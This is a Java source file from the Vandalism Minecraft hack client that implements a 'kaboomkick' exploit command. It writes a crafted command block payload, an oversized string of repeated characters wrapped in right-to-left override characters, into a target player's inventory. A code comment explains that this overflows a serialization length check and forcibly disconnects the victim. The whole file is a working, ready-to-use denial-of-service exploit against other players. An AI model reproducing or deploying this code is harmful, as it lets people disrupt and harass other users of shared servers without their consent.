/*
 * This file is part of Vandalism - https://github.com/NekosAreKawaii/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO, Recyz and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.command.impl.exploit;

import com.mojang.authlib.GameProfile;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import de.nekosarekawaii.vandalism.feature.command.AbstractCommand;
import de.nekosarekawaii.vandalism.feature.command.arguments.GreedyPlayerArgumentType;
import de.nekosarekawaii.vandalism.util.ChatUtil;
import net.minecraft.block.entity.BlockEntity;
import net.minecraft.block.entity.CommandBlockBlockEntity;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.command.CommandSource;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.CommandBlockMinecartEntity;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockMinecartC2SPacket;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.hit.EntityHitResult;
import net.minecraft.util.hit.HitResult;

import java.util.Arrays;
import java.util.Objects;
import java.util.UUID;
import java.util.concurrent.ThreadLocalRandom;

// How this works:
// netty checks are different to java.io's checks for string length: DataOutputStream checks if utflength > 65535 and then errors, netty doesn't, since real max bytes length for command blocks strings is 32767 * 3 in netty and not 32767 we exceed 65535 here which lets java.io.DataOutputStream error.
public class KaboomKickCommand extends AbstractCommand {

    private static final String KICK_STRING;

    static {
        final char[] chars = new char[32000];
        Arrays.fill(chars, (char) 0xFFF);
        KICK_STRING = new String(chars);
    }

    public KaboomKickCommand() {
        super("Kick players from kaboom-based servers.", Category.EXPLOIT, "kaboomkick");
    }

    @Override
    public final void build(final LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(argument("name", GreedyPlayerArgumentType.create()).executes(context -> {
            final String name = GreedyPlayerArgumentType.get(context);
            final UUID id = Objects.requireNonNull(this.mc.getNetworkHandler()).getPlayerList().stream().map(PlayerListEntry::getProfile).filter(profile -> Objects.equals(name, profile.getName())).map(GameProfile::getId).findFirst().orElseGet(() -> {
                try {
                    return UUID.fromString(name);
                } catch (final IllegalArgumentException ignored) {
                    return null;
                }
            });
            final HitResult result = this.mc.crosshairTarget;
            final String command = KaboomKickCommand.generateCommand(id != null ? KaboomKickCommand.generateUUIDSelector(id) : name);

            switch (result) {
                case final BlockHitResult blockHitResult -> {
                    final BlockEntity blockEntity = mc.world.getBlockEntity(blockHitResult.getBlockPos());
                    if (!(blockEntity instanceof CommandBlockBlockEntity)) {
                        ChatUtil.errorChatMessage("You must look at a command block or command block minecart to execute this command!");
                        return SINGLE_SUCCESS;
                    }
                    mc.player.networkHandler.sendPacket(new UpdateCommandBlockC2SPacket(
                            blockEntity.getPos(),
                            command,
                            CommandBlockBlockEntity.Type.AUTO,
                            false,
                            false,
                            true
                    ));
                }

                case final EntityHitResult entityHitResult -> {
                    final Entity entity = entityHitResult.getEntity();
                    if (!(entity instanceof CommandBlockMinecartEntity)) {
                        ChatUtil.errorChatMessage("You must look at a command block or command block minecart to execute this command!");
                        return SINGLE_SUCCESS;
                    }

                    mc.player.networkHandler.sendPacket(new UpdateCommandBlockMinecartC2SPacket(
                            entity.getId(),
                            command,
                            false
                    ));
                }

                default -> ChatUtil.errorChatMessage("You must look at a command block or command block minecart to execute this command!");
            }
            return SINGLE_SUCCESS;
        }));
    }

    private static String generateCommand(final String selector) {
        final String rightToLeftOverride = "\u202E".repeat(3);
        return String.format("minecraft:item replace entity %s container.9 with stone{\"%s\":\"bonkÂ§k%s%s%sblep\"} 1", selector, ThreadLocalRandom.current().nextBoolean() ? "catgirls.pet" : "test.ethanol.rocks", rightToLeftOverride, KaboomKickCommand.KICK_STRING, rightToLeftOverride);
    }

    public static String generateUUIDSelector(final UUID id) {
        return String.format("@a[nbt={UUID:%s}]", KaboomKickCommand.createUUIDArray(id));
    }

    public static String createUUIDArray(final UUID id) {
        final String[] array = new String[4];
        final long mostSignificantBits = id.getMostSignificantBits();
        final long leastSignificantBits = id.getLeastSignificantBits();
        array[0] = String.valueOf((int) (mostSignificantBits >> 32));
        array[1] = String.valueOf((int) (mostSignificantBits));
        array[2] = String.valueOf((int) (leastSignificantBits >> 32));
        array[3] = String.valueOf((int) (leastSignificantBits));
        return String.format("[I;%s]", String.join(",", array));
    }
}
